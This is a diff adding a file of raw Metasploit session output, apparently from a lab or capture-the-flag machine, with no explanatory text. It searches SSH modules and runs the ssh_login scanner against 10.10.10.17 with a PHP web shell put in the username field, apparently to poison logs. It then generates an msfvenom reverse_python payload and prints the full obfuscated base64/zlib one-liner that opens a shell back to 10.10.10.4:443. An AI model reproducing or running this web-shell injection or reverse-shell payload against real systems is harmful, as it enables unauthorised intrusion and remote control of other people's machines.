@@ -1,0 +1,113 @@
+
+
+
+
+msf6 > search ssh login
+
+Matching Modules
+================
+
+   #   Name                                                              Disclosure Date  Rank       Check  Description
+   -   ----                                                              ---------------  ----       -----  -----------
+   0   exploit/linux/http/alienvault_exec                                2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution
+   1   auxiliary/scanner/ssh/apache_karaf_command_execution              2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution
+   2   auxiliary/scanner/ssh/karaf_login                                 .                normal     No     Apache Karaf Login Utility
+   3   exploit/unix/ssh/array_vxag_vapv_privkey_privesc                  2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution
+   4   auxiliary/scanner/ssh/cerberus_sftp_enumusers                     2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration
+   5   auxiliary/scanner/http/cisco_firepower_login                      .                normal     No     Cisco Firepower Management Console 6.0 Login
+   6   exploit/linux/ssh/cisco_ucs_scpuser                               2019-08-21       excellent  No     Cisco UCS Director default scpuser password
+   7   exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684  2022-10-10       excellent  Yes    Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.
+   8   exploit/freebsd/http/junos_phprc_auto_prepend_file                2023-08-17       excellent  Yes    Junos OS PHPRC Environment Variable Manipulation RCE
+   9     \_ target: PHP In-Memory                                        .                .          .      .
+   10    \_ target: Interactive SSH with jail break                      .                .          .      .
+   11  exploit/linux/ssh/microfocus_obr_shrboadmin                       2020-09-21       excellent  No     Micro Focus Operations Bridge Reporter shrboadmin default password
+   12  post/linux/manage/sshkey_persistence                              .                excellent  No     SSH Key Persistence
+   13  post/windows/manage/sshkey_persistence                            .                good       No     SSH Key Persistence
+   14  auxiliary/scanner/ssh/ssh_login                                   .                normal     No     SSH Login Check Scanner
+   15  auxiliary/scanner/ssh/ssh_login_pubkey                            .                normal     No     SSH Public Key Login Scanner
+   16  exploit/linux/ssh/symantec_smg_ssh                                2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
+   17  exploit/unix/ssh/tectia_passwd_changereq                          2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability
+   18  post/windows/gather/credentials/mremote                           .                normal     No     Windows Gather mRemote Saved Password Extraction
+
+
+Interact with a module by name or index. For example info 18, use 18 or use post/windows/gather/credentials/mremote                                                                                               
+
+msf6 > use 14
+msf6 auxiliary(scanner/ssh/ssh_login) > options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   CreateSession     true             no        Create a new session for every successful login
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current dat
+                                                abase
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current databas
+                                                e (Accepted: none, user, user&realm)
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/doc
+                                                s/using-metasploit/basics/using-metasploit.html
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a cred
+   THREADS           1                yes       The number of concurrent 
+   USERNAME                           no        A specific username to au
+   USERPASS_FILE                      no        File containing users and
+                                                 one pair per line
+   USER_AS_PASS      false            no        Try the username as the p
+   USER_FILE                          no        File containing usernames
+   VERBOSE           false            yes       Whether to print output f
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 10.10.10.17 
+rhosts => 10.10.10.17
+msf6 auxiliary(scanner/ssh/ssh_login) > set username <?php system($_GET[k
+username => <?php system($_GET[k]); ?>
+msf6 auxiliary(scanner/ssh/ssh_login) > set password 12345
+password => 12345
+msf6 auxiliary(scanner/ssh/ssh_login) > exploit
+
+[*] 10.10.10.17:22 - Starting bruteforce
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > 
+
+
+
+
+
+
+msfvenom -p cmd/unix/reverse_python lhost=10.10.10.4 lport=443 -f raw  
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 356 bytes
+python -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNrLzC3ILypRKM5Pzk4tUYAAHQUYKC5NKijKT04tLsaQygcKWWfkF5fYKhka6EGQiRJQDGSerYmJMZBZbAsxVw9CaUB5jm7xnn6uIZi2QaSD/Z2944NDglwdfTVBhugl5+flpSaXaGiArMPQBbJPE6Qwv1gvpbTASKNYLy0zJzUvX0MTQ60BkeoMiVRnBFJXYIsIJr3kxJwcDSX9pMw8/eIMJU0Ap7daRA==')[0])))"
+                                                                               
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
